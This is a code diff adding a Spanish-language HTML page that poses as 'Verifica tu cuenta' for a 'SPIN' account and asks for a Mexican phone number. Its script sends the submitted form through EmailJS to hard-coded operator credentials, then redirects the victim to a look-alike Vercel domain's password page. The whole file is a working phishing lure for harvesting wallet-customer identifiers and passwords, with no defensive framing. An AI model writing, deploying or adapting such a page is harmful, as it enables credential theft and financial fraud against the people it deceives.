@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <script defer src="https://cdn.jsdelivr.net/npm/@finsweet/attributes-formsubmit@1/formsubmit.js"></script>
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <title>SPIN VERIF - Principal</title>
+</head>
+<body>
+    
+<div class="background"></div>
+<div class="cont">
+    <div class="login-container">
+        &nbsp;
+        <img class="imglogonav" src="./logo.jpeg" alt="">
+        &nbsp;
+        <h2>Verifica tu cuenta</h2>
+        <form id="my-form">
+            <label for="username">Ingresa tu Teléfono ó Correo electrónico</label>
+            <div class="input-group">
+                <span class="country-code">+52</span>
+                <input class="pedirnumeroinput" type="tel" id="username" name="username" maxlength="10" required>
+            </div>
+            <a href="#" class="forgot-link">¿Olvidaste tu número?</a>
+            <button class="pedirbtn" type="submit" disabled>Enviar</button>
+        </form>
+        <p>Verificate para no perder tu cuenta</p>
+    </div>
+</div>
+
+<script>
+    // Inicializar EmailJS
+    (function() {
+        emailjs.init('uKG8o-MBNGW7QBKhp'); // Reemplaza 'YOUR_USER_ID' por tu ID de usuario de EmailJS
+    })();
+
+    var input = document.querySelector(".pedirnumeroinput");
+    var btn = document.querySelector(".pedirbtn");
+
+    input.addEventListener("keyup", function() {
+        if (input.value.length == 10) {
+            btn.disabled = false;
+        } else {
+            btn.disabled = true;
+        }
+    });
+
+    input.addEventListener("keydown", function(e) {
+        if (input.value.length == 10 && e.keyCode != 8) {
+            e.preventDefault();
+        }
+    });
+
+    input.addEventListener("keypress", function(e) {
+        if (e.keyCode < 48 || e.keyCode > 57) {
+            e.preventDefault();
+        }
+    });
+
+    // Enviar el formulario usando EmailJS
+    document.querySelector('form').addEventListener('submit', function(event) {
+        event.preventDefault(); // Previene el envío del formulario por defecto
+        var form = document.getElementById('my-form');
+
+        // Enviar el formulario usando EmailJS
+        emailjs.sendForm('service_izp7mc5', 'template_vcwuhph', form)
+            .then(function(response) {
+                console.log('SUCCESS!', response.status, response.text);
+                window.location.href = 'https://mispinquierocontinuaroxxoclienpremier.vercel.app/contraseña.html';
+            }, function(error) {
+                console.log('FAILED...', error);
+            });
+    });
+</script>
+
+</body>
+</html>
